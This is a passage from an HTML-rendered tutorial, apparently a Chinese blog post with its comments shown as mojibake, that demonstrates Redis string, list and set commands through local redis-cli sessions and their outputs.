class="string">&quot;v1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v2&quot;</span></span><br><span class="line">3) <span class="string">&quot;v3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; mget k1 k2 k3 k4</span><br><span class="line">1) <span class="string">&quot;v1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v2&quot;</span></span><br><span class="line">3) <span class="string">&quot;v3&quot;</span></span><br><span class="line">4) (nil)</span><br><span class="line">127.0.0.1:6379&gt; msetnx k1 v1 k4 v4  <span class="comment"># msetnx æ˜¯ä¸€ä¸ªåŸå­æ€§çš„æ“ä½œï¼Œè¦ä¹ˆä¸€èµ·æˆåŠŸï¼Œè¦ä¹ˆä¸€èµ·å¤±è´¥ï¼</span></span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; get k4</span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> user:1 &#123;name:zyy,age:18&#125; <span class="comment"># è®¾ç½®ä¸€ä¸ªuser:1 å¯¹è±¡ï¼Œå€¼ä¸ºjsonå­—ç¬¦æ¥ä¿å­˜ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;k2&quot;</span></span><br><span class="line">2) <span class="string">&quot;k3&quot;</span></span><br><span class="line">3) <span class="string">&quot;k1&quot;</span></span><br><span class="line">4) <span class="string">&quot;user:1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; get user:1:name</span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; get user:1</span><br><span class="line"><span class="string">&quot;&#123;name:zyy,age:18&#125;&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> user:2 &#123;name:zyy2,age:18&#125;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;k2&quot;</span></span><br><span class="line">2) <span class="string">&quot;k1&quot;</span></span><br><span class="line">3) <span class="string">&quot;k3&quot;</span></span><br><span class="line">4) <span class="string">&quot;user:1&quot;</span></span><br><span class="line">5) <span class="string">&quot;user:2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; mset user:1:name zyy user:1:age 18 <span class="comment"># è¿™é‡Œçš„keyæ˜¯ä¸€ä¸ªå·§å¦™çš„è®¾è®¡ï¼š user:&#123;id&#125;:&#123;filed&#125; , å¦‚æ­¤è®¾è®¡åœ¨Redisä¸­æ˜¯å®Œå…¨OKäº†ï¼</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;k2&quot;</span></span><br><span class="line">2) <span class="string">&quot;k1&quot;</span></span><br><span class="line">3) <span class="string">&quot;k3&quot;</span></span><br><span class="line">4) <span class="string">&quot;user:1&quot;</span></span><br><span class="line">5) <span class="string">&quot;user:1:age&quot;</span></span><br><span class="line">6) <span class="string">&quot;user:1:name&quot;</span></span><br><span class="line">7) <span class="string">&quot;user:2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; mget user:1:name user:1:age</span><br><span class="line">1) <span class="string">&quot;zyy&quot;</span></span><br><span class="line">2) <span class="string">&quot;18&quot;</span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment">## getset å…ˆgetå†set</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; getset k1 v1 <span class="comment"># å…ˆgetï¼Œå†set  å¦‚æœä¸€å¼€å§‹keyå°±ä¸å­˜åœ¨ï¼Œå°±è¿”å›nil</span></span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; get k1</span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; getset k1 1 <span class="comment"># # å…ˆgetï¼Œå†set  å¦‚æœä¸€å¼€å§‹å€¼å­˜åœ¨ï¼Œå°±åæ­£è¿™ä¸ªå€¼ï¼ˆè¿”å›çš„æ—§å€¼ï¼Œè®¾ç½®çš„æ–°å€¼ï¼‰</span></span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; get k1</span><br><span class="line"><span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<p>Stringç±»ä¼¼çš„ä½¿ç”¨åœºæ™¯ï¼švalueé™¤äº†æ˜¯æˆ‘ä»¬çš„å­—ç¬¦ä¸²è¿˜å¯ä»¥æ˜¯æˆ‘ä»¬çš„æ•°å­—ï¼</p>
<ul>
<li>è®¡æ•°å™¨</li>
<li>ç²‰ä¸æ•°</li>
<li>å¯¹è±¡ç¼“å­˜å­˜å‚¨</li>
</ul>
<h2 id="3ã€Listï¼ˆåˆ—è¡¨ï¼‰"><a href="#3ã€Listï¼ˆåˆ—è¡¨ï¼‰" class="headerlink" title="3ã€Listï¼ˆåˆ—è¡¨ï¼‰"></a>3ã€Listï¼ˆåˆ—è¡¨ï¼‰</h2><p>Redisåˆ—è¡¨æ˜¯ç®€å•çš„å­—ç¬¦ä¸²åˆ—è¡¨ï¼ŒæŒ‰ç…§æ’å…¥é¡ºåºæ’åºã€‚æŒ‰ç…§æ’å…¥é¡ºåºæ’åºã€‚ä½ å¯ä»¥æ·»åŠ ä¸€ä¸ªå…ƒç´ åˆ°åˆ—è¡¨çš„å¤´éƒ¨ï¼ˆå·¦è¾¹ï¼‰æˆ–è€…å°¾éƒ¨ï¼ˆå³è¾¹ï¼‰</p>
<p>åœ¨redisé‡Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠlistç©æˆ æ ˆã€é˜Ÿåˆ—ã€é˜»å¡é˜Ÿåˆ—ï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; lpush list a b c <span class="comment"># å°†ä¸€ä¸ªæˆ–è€…å¤šä¸ªå€¼æ’å…¥åˆ—è¡¨å¤´éƒ¨ï¼ˆå·¦ï¼‰</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 1 <span class="comment"># è·å–æŒ‡å®šèŒƒå›´çš„åˆ—è¡¨</span></span><br><span class="line">1) <span class="string">&quot;c&quot;</span></span><br><span class="line">2) <span class="string">&quot;b&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1 <span class="comment"># è·å–åˆ—è¡¨ä¸­çš„æ‰€æœ‰å€¼</span></span><br><span class="line">1) <span class="string">&quot;c&quot;</span></span><br><span class="line">2) <span class="string">&quot;b&quot;</span></span><br><span class="line">3) <span class="string">&quot;a&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; rpush list2 a b c <span class="comment"># å°†ä¸€ä¸ªæˆ–è€…å¤šä¸ªå€¼æ’å…¥åˆ—è¡¨å°¾éƒ¨ï¼ˆå³ï¼‰</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; lrange list2 0 -1</span><br><span class="line">1) <span class="string">&quot;a&quot;</span></span><br><span class="line">2) <span class="string">&quot;b&quot;</span></span><br><span class="line">3) <span class="string">&quot;c&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; rrange list 0 -1 <span class="comment"># æ²¡æœ‰rrangeè¿™ä¸ªå‘½ä»¤å“¦</span></span><br><span class="line">(error) ERR unknown <span class="built_in">command</span> <span class="string">&#x27;rrange&#x27;</span>, with args beginning with: <span class="string">&#x27;list&#x27;</span> <span class="string">&#x27;0&#x27;</span> <span class="string">&#x27;-1&#x27;</span> </span><br><span class="line">127.0.0.1:6379&gt; lpop list  <span class="comment"># ç§»é™¤listç¬¬ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1 <span class="comment">#ç§»é™¤listæœ€åä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; rpop list </span><br><span class="line"><span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange list</span><br><span class="line">(error) ERR wrong number of arguments <span class="keyword">for</span> <span class="string">&#x27;lrange&#x27;</span> <span class="built_in">command</span></span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lindex list 0 <span class="comment"># é€šè¿‡ä¸‹æ ‡è·å¾— list ä¸­çš„æŸä¸€ä¸ªå€¼ï¼</span></span><br><span class="line"><span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lindex list 5</span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; lindex list 3</span><br><span class="line"><span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; clear</span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; llen list <span class="comment"># è¿”å›åˆ—è¡¨é•¿åº¦</span></span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; llen list</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; lrem list 1 1</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;3&quot;</span></span><br><span class="line">3) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrem list 2 1</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; lpush list 1 1</span><br><span class="line">(<span class="built_in">integer</span>) 5</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;1&quot;</span></span><br><span class="line">3) <span class="string">&quot;2&quot;</span></span><br><span class="line">4) <span class="string">&quot;3&quot;</span></span><br><span class="line">5) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrem list 1 2</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;1&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrem list 2 1 <span class="comment"># ç§»é™¤listé›†åˆä¸­æŒ‡å®šä¸ªæ•°çš„valueï¼Œç²¾ç¡®åŒ¹é…</span></span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;3&quot;</span></span><br><span class="line">2) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; ltrim list 1 2 <span class="comment"># é€šè¿‡ä¸‹æ ‡æˆªå–æŒ‡å®šçš„é•¿åº¦ï¼Œè¿™ä¸ªlistå·²ç»è¢«æ”¹å˜äº†ï¼Œæˆªæ–­äº† åªå‰©ä¸‹æˆªå–çš„å…ƒç´ ï¼</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; rpoplpush list list2 <span class="comment"># ç§»é™¤åˆ—è¡¨çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå°†ä»–ç§»åŠ¨åˆ°æ–°çš„åˆ—è¡¨çš„å¤´éƒ¨ï¼</span></span><br><span class="line"><span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrange list2 0 -1</span><br><span class="line">1) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; exists list <span class="comment"># åˆ¤æ–­åˆ—è¡¨æ˜¯å¦å­˜åœ¨ï¼Œè¿”å›1å°±æ˜¯å­˜åœ¨ï¼Œ è¿”å›0å°±æ˜¯ä¸å­˜åœ¨</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; exists list2</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; lset list 0 a <span class="comment"># æ›¿æ¢è¿™ä¸ªä¸‹é¢å¯¹åº”çš„å€¼</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;a&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lset list2 0 a <span class="comment"># æ›¿æ¢æ—¶ï¼Œåˆ—è¡¨ä¸å­˜åœ¨æŠ¥è¿™ä¸ªé”™è¯¯</span></span><br><span class="line">(error) ERR no such key</span><br><span class="line">127.0.0.1:6379&gt; lset list 4 a</span><br><span class="line">(error) ERR index out of range <span class="comment"># æ›¿æ¢æ—¶ï¼Œä¸‹æ ‡è¶Šç•ŒæŠ¥è¿™ä¸ªé”™è¯¯</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; flushdb</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; rpush list 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; linsert list before 1 0 <span class="comment"># å°†æŸä¸ªå…·ä½“çš„valueæ’å…¥åˆ°åˆ—æŠŠä½ ä¸­æŸä¸ªå…ƒç´ çš„å‰é¢æˆ–è€…åé¢ï¼</span></span><br><span class="line">(<span class="built_in">integer</span>) 5</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;0&quot;</span></span><br><span class="line">2) <span class="string">&quot;1&quot;</span></span><br><span class="line">3) <span class="string">&quot;2&quot;</span></span><br><span class="line">4) <span class="string">&quot;3&quot;</span></span><br><span class="line">5) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; linsert list after 4 5</span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1</span><br><span class="line">1) <span class="string">&quot;0&quot;</span></span><br><span class="line">2) <span class="string">&quot;1&quot;</span></span><br><span class="line">3) <span class="string">&quot;2&quot;</span></span><br><span class="line">4) <span class="string">&quot;3&quot;</span></span><br><span class="line">5) <span class="string">&quot;4&quot;</span></span><br><span class="line">6) <span class="string">&quot;5&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>å°ç»“</p>
</blockquote>
<ul>
<li>ä»–å®é™…ä¸Šæ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œbefore Node after ï¼Œ leftï¼Œright éƒ½å¯ä»¥æ’å…¥å€¼</li>
<li>å¦‚æœkey ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°çš„é“¾è¡¨</li>
<li>å¦‚æœkeyå­˜åœ¨ï¼Œæ–°å¢å†…å®¹</li>
<li>å¦‚æœç§»é™¤äº†æ‰€æœ‰å€¼ï¼Œç©ºé“¾è¡¨ï¼Œä¹Ÿä»£è¡¨ä¸å­˜åœ¨</li>
<li>åœ¨ä¸¤è¾¹æ’å…¥æˆ–è€…æ”¹åŠ¨å€¼ï¼Œæ•ˆç‡æœ€é«˜ï¼ ä¸­é—´å…ƒç´ ï¼Œç›¸å¯¹æ¥è¯´æ•ˆç‡ä¼šä½ä¸€ç‚¹~</li>
</ul>
<p>æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆLpush Rpopï¼‰</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/ce6a1c42a3b3c6be6148e81ac4cfe196--2f13--image-20240918193951067.png" alt="image-20240918193951067"></p>
<p>æ ˆï¼ˆ Lpush Lpopï¼‰</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/b456052fd61d13bc0061169663b6b004--1542--image-20240918193959804.png" alt="image-20240918193959804"></p>
<h2 id="4ã€Seté›†åˆ"><a href="#4ã€Seté›†åˆ" class="headerlink" title="4ã€Seté›†åˆ"></a>4ã€Seté›†åˆ</h2><p>Redis çš„ Set æ˜¯ String ç±»å‹çš„æ— åºé›†åˆã€‚é›†åˆæˆå‘˜æ˜¯å”¯ä¸€çš„ï¼Œè¿™å°±æ„å‘³ç€é›†åˆä¸­ä¸èƒ½å‡ºç°é‡å¤çš„æ•°æ®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; sadd setkey1 1 2 3 4 <span class="comment"># 	seté›†åˆä¸­æ·»åŠ å…ƒç´ </span></span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; smembers setkey1 <span class="comment"># æŸ¥çœ‹æŒ‡å®šsetçš„æ‰€æœ‰å€¼</span></span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; sismember setkey1 1  <span class="comment"># åˆ¤æ–­æŸä¸€ä¸ªå€¼æ˜¯ä¸æ˜¯åœ¨seté›†åˆä¸­ï¼ è¿”å›1ä»£è¡¨å­˜åœ¨ï¼Œè¿”å›0ä»£è¡¨ä¸å­˜åœ¨</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; sismember setkey1 5</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; sadd setkey1 5</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; smembers setkey1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">5) <span class="string">&quot;5&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; sadd setkey1 1 2 <span class="comment"># seté›†åˆä¸å¯æ·»åŠ é‡å¤çš„å€¼</span></span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; smembers setkey1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">5) <span class="string">&quot;5&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; scard setkey1 <span class="comment"># è·å–seté›†åˆä¸­çš„å†…å®¹å…ƒç´ ä¸ªæ•°ï¼</span></span><br><span class="line">(<span class="built_in">integer</span>) 5</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; sadd set1 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; srem set1 1 <span class="comment"># ç§»é™¤seté›†åˆä¸­çš„æŒ‡å®šå…ƒç´ </span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;3&quot;</span></span><br><span class="line">3) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; scard set1</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; sadd set1 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; srandmember set1 <span class="comment"># éšæœºæŠ½é€‰å‡ºä¸€ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; srandmember set1</span><br><span class="line"><span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; srandmember set1 2 <span class="comment"># éšæœºæŠ½é€‰å‡ºæŒ‡å®šä¸ªæ•°çš„å…ƒç´ </span></span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; srandmember set1 2</span><br><span class="line">1) <span class="string">&quot;3&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; sadd set1 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; spop set1 <span class="comment"># éšæœºåˆ é™¤ä¸€äº›seté›†åˆä¸­çš„å…ƒç´ ï¼</span></span><br><span class="line"><span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; spop set1 </span><br><span class="line"><span class="string">&quot;3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; spop set1 2 <span class="comment"># éšæœºåˆ é™¤æŒ‡å®šä¸ªæ•°çš„å…ƒç´ </span></span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; spop set1 </span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; sadd set1 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; smove set1 set2 1 <span class="comment"># å°†é›†åˆä¸­çš„ä¸€ä¸ªæŒ‡å®šçš„å€¼ï¼Œç§»åŠ¨åˆ°å¦å¤–ä¸€ä¸ªseté›†åˆï¼</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;2&quot;</span></span><br><span class="line">2) <span class="string">&quot;3&quot;</span></span><br><span class="line">3) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; smembers set2</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; sadd set1 1 2 3 4</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; sadd set2 3 4 5 6</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; smembers set1</span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span class="string">&quot;2&quot;</span></span><br><span class="line">3) <span class="string">&quot;3&quot;</span></span><br><span class="line">4) <span class="string">&quot;4&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; smembers set2</span><br><span class="line">1) <span class="string">&quot;3&quot;</span></span><br><span class="line">2) <span class="string">&quot;4&quot;</span></span><br><span class="line">3) <span class="string">&quot;5&quot;</span></span><br><span class="line">4) <span class="string">&quot;6&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; sdiff set1 set2 <span class="comment"># å·®é›†</span></span><br><span class="line">1) <span class="string">&quot;1&quot;</span></span><br><span class="line">2) <span 